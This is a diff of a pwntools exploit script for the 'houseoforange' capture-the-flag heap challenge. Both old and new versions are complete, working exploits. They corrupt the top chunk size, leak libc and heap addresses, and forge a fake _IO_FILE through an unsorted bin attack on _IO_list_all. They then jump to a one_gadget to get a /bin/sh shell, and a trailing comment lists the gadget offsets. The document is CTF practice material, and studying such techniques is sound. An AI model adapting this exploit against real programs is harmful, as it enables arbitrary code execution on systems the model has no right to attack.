@@ -1,87 +1,105 @@
 from pwn import *
 
-DEBUG = 1
+p=process('./houseoforange')
+elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
-p = process('./houseoforange')
-elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+context.log_level=1
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+#one_gadget=0x45216
+#one_gadget=0x4526A
+#one_gadget=0xf02a4
+one_gadget=0xf1147
+IO_list_all=elf.symbols['_IO_list_all']
 
-if DEBUG == 1:
-  context.log_level='debug'
-  gdb.attach(p)
+sd=lambda x: p.send(x)
+sl=lambda x: p.sendline(x)
+rv=lambda x: p.recvuntil(x)
+sa=lambda a,x: p.sendafter(a,x)
+sla=lambda a,x: p.sendlineafter(a,x)
 
-def sd(content):
-  p.send(content)
+menu='Your choice : '
 
-def sl(content):
-  p.sendline(content)
+def add(size,content=''):
+    sla(menu,'1')
+    sla('Length of name :',str(size))
+    sla('Name :',content)
+    sla('Price of Orange:','2')
+    sla('Color of Orange:',str(0xddaa))
 
-def rv(content):
-  p.recvuntil(content)
+def show():
+    sla(menu,'2')
 
-def build(size,content,price,color):
-  rv('choice : ')
-  sl('1')
-  rv('name :')
-  sl(str(size))
-  rv('Name :')
-  sd(content)
-  rv('Orange:')
-  sl(str(price))
-  rv(':')
-  sl(str(color))
 
-def upgrade(size,content,price,color):
-  rv('choice : ')
-  sl('3')
-  rv('name :')
-  sl(str(size))
-  rv('Name:')
-  sd(content)
-  rv('Orange: ')
-  sl(str(price))
-  rv(': ')
-  sl(str(color))
+def edit(size,content):
+    sla(menu,'3')
+    sla('Length of name :',str(size))
+    sla('Name:',content)
+    sla('Price of Orange:','2')
+    sla('Color of Orange:',str(0xddaa))
 
-def see():
-  rv(':')
-  sl('2')
-  
 
-head=p64(0)+p64(0x21)+p32(1)+p32(31)+p64(0)
 
-#--------------------------------
-# first build and upgrade
-# edit the top chunk size
-build(0x200,'\n',1,1)
-upgrade(0x300,'a'*0x200+head+p64(0)+p64(0xdb1),1,1)
+add(0x200)
 
-#--------------------------------
-# then build a chunk that large enough to call brk
-# and got a unsorted bin
-build(0x1000,'\n',1,1)
+payload='a'*0x200
+payload+=p64(0)+p64(0x21)
+payload+=p64(0x0000ddaa00000002)
+payload+=p64(0)*2
+payload+=p64(0xdb1)
 
-#--------------------------------
-# split one chunk from unsorted bin and leak libc-base
-build(0x200,'\n',1,1)
-see()
-rv('house : ')
-libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b0a
-log.info('libc_base = '+hex(libc_base))
+edit(0x1111,payload)
+add(0x1000)
 
-#--------------------------------
-# upgrade it and use unsorted bin attack to 
-# fool the _IO_FILE system
-_IO_list_all=libc_base+elf.symbols['_IO_list_all']
-_IO_file_jumps=libc_base+elf.symbols['_IO_file_jumps']+0xc0
-file_struct=p64(0)+p64(0x61)
-file_struct+=p64(0)+p64(_IO_list_all-0x10)
-file_struct+=p64(2)+p64(3)
-file_struct=file_struct.ljust(0xd8,'\x00')
-file_struct+=p64(_IO_file_jumps)
-file_struct+=p64(libc_base+0x4526a)
+add(0x400)
+show()
+rv('Name of house : ')
+libc_base=u64(p.recv(6)+2*'\x00')-0x3c510a
 
-upgrade(0x1000,'a'*0x200+head+file_struct,1,1)
+edit(17,'a'*16)
+show()
+rv('a'*16)
+chunk_base=u64(p.recv(6)+2*'\x00')-0x20a
 
-sl('1\n200')
+log.info('libc  base is:'+hex(libc_base))
+log.info('chunk base is:'+hex(chunk_base))
+
+
+payload='a'*0x400
+payload+=p64(0)+p64(0x21)
+payload+=p64(0xddaa00000002)
+payload+=p64(0)*2
+payload+=p64(0x61)
+payload+=p64(0)+p64(libc_base+IO_list_all-0x10)
+payload+=p64(0)+p64(1)
+payload+=p64(0)*21
+payload+=p64(chunk_base+0x7c0)
+payload+=p64(0)*3+p64(one_gadget+libc_base)
+
+edit(0x1111,payload)
+gdb.attach(p,gdbscript='b __libc_message\nc')
+
+sla(menu,'1')
+#sla('Length of name :',str(0x200))
 
 p.interactive()
+
+
+
+'''
+0x45216	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  rax == NULL
+
+0x4526a	execve("/bin/sh", rsp+0x30, environ)
+constraints:
+  [rsp+0x30] == NULL
+
+0xf02a4	execve("/bin/sh", rsp+0x50, environ)
+constraints:
+  [rsp+0x50] == NULL
+
+0xf1147	execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+'''
